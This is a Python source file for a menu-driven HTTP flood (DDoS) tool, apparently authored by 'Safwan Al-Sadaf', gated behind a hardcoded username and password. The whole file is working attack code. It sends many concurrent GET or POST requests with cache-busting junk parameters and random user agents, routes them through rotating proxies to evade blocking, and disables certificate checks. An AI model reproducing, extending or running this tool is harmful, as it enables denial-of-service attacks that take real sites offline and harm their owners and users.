import asyncio
import random
import socket
import ssl
import sys
import time
from aiohttp import ClientSession, TCPConnector
from fake_useragent import UserAgent
from urllib.parse import urlparse, quote


class DDosAttack:
    def __init__(self):
        self.target = ""
        self.threads = 100
        self.proxy_file = ""
        self.running = True
        self.ua = UserAgent()
        self.proxies = []
        self.ssl_ctx = self.create_ssl_context()
        self.method = "GET"
        self.delay = 0
        self.attack_duration = 0

    def create_ssl_context(self):
        ctx = ssl.create_default_context()
        ctx.set_ciphers('ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256')
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def authenticate(self):
        print("\n\033[94m====== LOGIN REQUIRED ======\033[0m")
        username = input("[?] Enter username: ").strip()
        password = input("[?] Enter password: ").strip()
        if username != "Safwan Al-Sadaf" or password != "Cyber protector army":
            print("\n[!] Invalid credentials. Access denied.\n")
            sys.exit(1)
        print("\n✅ Login successful!\n")

    def load_proxies(self):
        try:
            with open(self.proxy_file, 'r') as f:
                self.proxies = [f"http://{line.strip()}" for line in f if ':' in line]
            print(f"[+] Loaded {len(self.proxies)} proxies")
        except Exception as e:
            print(f"[!] Proxy error: {str(e)}")
            self.proxies = []

    def show_banner(self):
        print("""\033[92m
  ____         __                       
 / ___|  __ _ / _|_      ____ _ _ __   
 \___ \ / _` | |_\ \ /\ / / _` | '_ \  
  ___) | (_| |  _|\ V  V / (_| | | | | 
 |____/ \__,_|_|   \_/\_/ \__,_|_| |_| 

       \033[96mDeveloped by Safwan Al-Sadaf\033[0m
        """)

    def menu(self):
        self.show_banner()
        print("1. Set Target URL")
        print("2. Load Proxy List")
        print("3. Set Threads")
        print("4. Set Request Method (GET/POST)")
        print("5. Set Delay Between Requests (in seconds)")
        print("6. Set Attack Duration (in seconds)")
        print("7. Start HTTP Storm")
        print("8. Exit")
        choice = input("\n[+] Select option: ")
        return choice

    async def http_attack(self):
        async with ClientSession(
            connector=TCPConnector(ssl=self.ssl_ctx),
            headers=self.generate_headers()
        ) as session:
            end_time = time.time() + self.attack_duration if self.attack_duration > 0 else float('inf')
            while self.running and time.time() < end_time:
                proxy = random.choice(self.proxies) if self.proxies else None
                try:
                    url = f"{self.target}?{self.generate_junk()}"
                    if self.method.upper() == "GET":
                        async with session.get(url, proxy=proxy, timeout=20) as response:
                            await response.content.read(-1)
                            print(f"[+] {response.status} - GET sent")
                    elif self.method.upper() == "POST":
                        async with session.post(url, data={"data": self.generate_junk()}, proxy=proxy, timeout=20) as response:
                            await response.content.read(-1)
                            print(f"[+] {response.status} - POST sent")
                except Exception as e:
                    print(f"[!] Error: {e}")
                await asyncio.sleep(self.delay)

    def generate_junk(self):
        return quote(f'_={random.randint(1e9,1e12)}&cache={random.random()}')

    def generate_headers(self):
        return {
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml',
            'Accept-Language': 'en-US;q=0.8,en;q=0.7',
            'Connection': 'keep-alive'
        }

    async def attack_loop(self):
        tasks = [self.http_attack() for _ in range(self.threads)]
        await asyncio.gather(*tasks)

    def run(self):
        self.authenticate()
        while True:
            choice = self.menu()
            if choice == '1':
                self.target = input("[+] Enter target URL (http/https): ").strip()
            elif choice == '2':
                self.proxy_file = input("[+] Proxy file path: ").strip()
                self.load_proxies()
            elif choice == '3':
                self.threads = int(input("[+] Threads (10-1000): "))
            elif choice == '4':
                self.method = input("[+] Request method (GET or POST): ").strip().upper()
            elif choice == '5':
                self.delay = float(input("[+] Delay between requests (e.g., 0.5): "))
            elif choice == '6':
                self.attack_duration = int(input("[+] Attack duration in seconds: "))
            elif choice == '7':
                print("[!] Attack started (Ctrl+C to stop)")
                try:
                    asyncio.run(self.attack_loop())
                except KeyboardInterrupt:
                    self.running = False
                    print("\n[!] Stopped by user")
            elif choice == '8':
                sys.exit("[+] Exit")
            else:
                print("[!] Invalid option")


if __name__ == "__main__":
    ddos = DDosAttack()
    ddos.run()